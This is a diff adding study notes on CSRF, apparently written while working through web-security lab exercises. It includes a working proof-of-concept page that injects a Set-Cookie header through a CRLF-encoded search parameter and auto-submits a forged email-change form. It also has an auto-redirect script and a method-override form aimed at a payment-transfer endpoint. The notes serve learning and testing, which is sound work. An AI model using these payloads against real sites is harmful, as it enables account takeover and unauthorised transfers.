@@ -83,3 +83,81 @@ Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoS
 csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
 ```
 
+- As an example we find that the ``search`` parameter get reflected in the Cookie so we use it to change the ``CSRF-key``
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+	<body>
+		<h1>Form CSRF PoC</h1>
+		<form method="POST" action="https://0a8a00fd04aa31ba81e63e9900fc0054.web-security-academy.net/my-account/change-email">
+			<input type="hidden" name="email" value="evilll@gmail.com">
+			<input type="hidden" name="csrf" value="tl8Xk0HeIe4g2zWoYOVie3FT5XSnz8Ez">
+		</form>
+		<img src="https://example.com/?search=test%0d%0aSet-Cookie:%20csrfKey=axu67BtsFqYuc4h4P9taMjLIfMGwa1cq%3b%20SameSite=None" onerror="document.forms[0].submit()">
+	</body>
+</html>
+
+```
+
+#### CSRF token is simply duplicated in a cookie
+
+```js
+POST /email/change HTTP/1.1 
+Host: vulnerable-website.com 
+Content-Type: application/x-www-form-urlencoded 
+Content-Length: 68 
+Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa 
+csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
+```
+
+- in this situation leverage the cookie-setting behaviour to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack.
+
+## Bypassing SameSite cookie restrictions
+
+- SameSite is a browser security mechanism that determines when a website's cookies are included in requests originating from other websites
+#### Difference between a site and an origin
+
+|                           |                                |                       |                            |
+| ------------------------- | ------------------------------ | --------------------- | -------------------------- |
+| **Request from**          | **Request to**                 | **Same-site?**        | **Same-origin?**           |
+| `https://example.com`     | `https://example.com`          | Yes                   | Yes                        |
+| `https://app.example.com` | `https://intranet.example.com` | Yes                   | No: mismatched domain name |
+| `https://example.com`     | `https://example.com:8080`     | Yes                   | No: mismatched port        |
+| `https://example.com`     | `https://example.co.uk`        | No: mismatched eTLD   | No: mismatched domain name |
+| `https://example.com`     | `http://example.com`           | No: mismatched scheme | No: mismatched scheme      |
+#### Strict
+
+- If a cookie is set with the `SameSite=Strict` attribute, browsers will not send it in any cross-site requests. In simple terms, this means that if the target site for the request does not match the site currently shown in the browser's address bar, it will not include the cookie.
+#### Lax
+
+`Lax` SameSite restrictions mean that browsers will send the cookie in cross-site requests, but only if both of the following conditions are met:
+- The request uses the `GET` method.
+- The request resulted from a top-level navigation by the user, such as clicking on a link.
+#### None
+
+- If a cookie is set with the `SameSite=None` attribute, this effectively disables SameSite restrictions altogether, regardless of the browser. As a result, browsers will send this cookie in all requests to the site that issued it, even those that were triggered by completely unrelated third-party sites.
+
+- When setting a cookie with `SameSite=None`, the website must also include the `Secure` attribute, which ensures that the cookie is only sent in encrypted messages over HTTPS. Otherwise, browsers will reject the cookie and it won't be set. `Set-Cookie: trackingId=0F8tgdOhi9ynR1M9wa3ODa; SameSite=None; Secure`
+
+## Bypassing SameSite 
+#### Bypassing SameSite Lax restrictions using GET requests
+
+- we may still be able to perform a CSRF attack by eliciting a `GET` request from the victim's browser
+
+```html
+<script>
+	document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000'; 
+</script>
+```
+
+- Even if an ordinary `GET` request isn't allowed, some frameworks provide ways of overriding the method specified in the request line. For example, Symfony supports the `_method` parameter in forms, which takes precedence over the normal method for routing purposes
+
+```html
+<form action="https://vulnerable-website.com/account/transfer-payment" method="GET"> 
+	<input type="hidden" name="_method" value="POST"> 
+	<input type="hidden" name="recipient" value="hacker"> 
+	<input type="hidden" name="amount" value="1000000"> 
+</form>
+```
+
